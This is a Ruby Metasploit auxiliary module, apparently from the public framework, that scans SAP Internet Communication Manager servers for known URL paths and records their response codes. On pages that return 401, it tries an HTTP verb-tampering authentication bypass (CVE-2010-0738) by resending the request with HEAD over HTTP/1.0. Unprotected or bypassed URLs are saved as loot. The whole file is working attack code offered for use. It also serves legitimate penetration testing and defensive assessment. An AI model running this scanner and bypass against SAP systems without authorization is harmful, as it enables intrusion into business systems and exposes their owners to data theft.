##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'SAP URL Scanner',
      'Description'   => %q{
        This module scans for commonly found SAP Internet Communication Manager URLs
        and outputs return codes for the user.
      },
      'Author'          => [ 'Chris John Riley' ],
      'References'      =>
        [
          [ 'CVE', '2010-0738' ] # VERB auth bypass
        ],
      'License'         => MSF_LICENSE
      ))

    register_options(
      [
        OptString.new('VERB',    [true, "Verb for auth bypass testing", "HEAD"]),
        OptPath.new('URLFILE', [true, "SAP ICM Paths File",
          File.join(Msf::Config.data_directory, 'wordlists', 'sap_icm_paths.txt')])
      ], self.class)
  end

  # Base Structure of module borrowed from jboss_vulnscan
  def run_host(ip)
    res = send_request_cgi(
      {
        'uri'       => "/" + Rex::Text.rand_text_alpha(12),
        'method'    => 'GET',
      })

    if res
      print_status("Note: Please note these URLs may or may not be of interest based on server configuration")
      @info = []
      if not res.headers['Server'].nil?
        @info << res.headers['Server']
        print_status("#{rhost}:#{rport} Server responded with the following Server Header: #{@info[0]}")
      else
        print_status("#{rhost}:#{rport} Server responded with a blank or missing Server Header")
      end

      if (res.body and /class="note">(.*)code:(.*)</i.match(res.body) )
        print_error("#{rhost}:#{rport} SAP ICM error message: #{$2}")
      end

      # Load URLs
      urls_to_check = []
      File.open(datastore['URLFILE']) do |f|
        f.each_line do |line|
          urls_to_check.push line
        end
      end

      print_status("#{rhost}:#{rport} Beginning URL check")
      @valid_urls = ''
      urls_to_check.each do |url|
        check_url(url.strip)
      end
    else
      print_error("#{rhost}:#{rport} No response received")
    end

    if @valid_urls.length > 0
      l = store_loot(
        'sap.icm.urls',
        "text/plain",
        datastore['RHOST'],
        @valid_urls,
        "icm_urls.txt", "SAP ICM Urls"
      )
      print_line
      print_good("Stored urls as loot: #{l}") if l
    end
  end

  def check_url(url)
    full_url = write_url(url)
    res = send_request_cgi({
      'uri'       => normalize_uri(url),
      'method'    => 'GET',
    })

    if (res)
      if not @info.include?(res.headers['Server']) and not res.headers['Server'].nil?
        print_good("New server header seen [#{res.headers['Server']}]")
        @info << res.headers['Server'] #Add To seen server headers
      end

      case res.code
      when 200
        print_good("#{full_url} - does not require authentication (#{res.code})")
        @valid_urls << full_url << "\n"
      when 403
        print_status("#{full_url} - restricted (#{res.code})")
      when 401
        print_status("#{full_url} - requires authentication (#{res.code}): #{res.headers['WWW-Authenticate']}")
        # Attempt verb tampering bypass
        bypass_auth(url)
      when 404
        # Do not return by default, only display in verbose mode
        vprint_status("#{full_url} - not found (#{res.code})")
      when 400,500
        print_status("#{full_url} - produced a server error (#{res.code})")
      when 301, 302, 307
        print_good("#{full_url} - redirected (#{res.code}) to #{res.redirection} (not following)")
        @valid_urls << full_url << "\n"
      else
        print_error("#{full_url} - unhandled response code #{res.code}")
        @valid_urls << full_url << "\n"
      end

    else
      vprint_status("#{full_url} - not found (No Repsonse code Received)")
    end
  end

  def write_url(path)
    if datastore['SSL']
      protocol = 'https://'
    else
      protocol = 'http://'
    end

    "#{protocol}#{rhost}:#{rport}#{path}"
  end

  def bypass_auth(url)
    full_url = write_url(url)
    vprint_status("#{full_url} Check for verb tampering (#{datastore['VERB']})")

    res = send_request_raw({
      'uri'       => normalize_uri(url),
      'method'    => datastore['VERB'],
      'version'   => '1.0' # 1.1 makes the head request wait on timeout for some reason
    })

    if (res and res.code == 200)
      print_good("#{full_url} Got authentication bypass via HTTP verb tampering")
      @valid_urls << full_url << "\n"
    else
      vprint_status("#{full_url} Could not get authentication bypass via HTTP verb tampering")
    end
  end
end
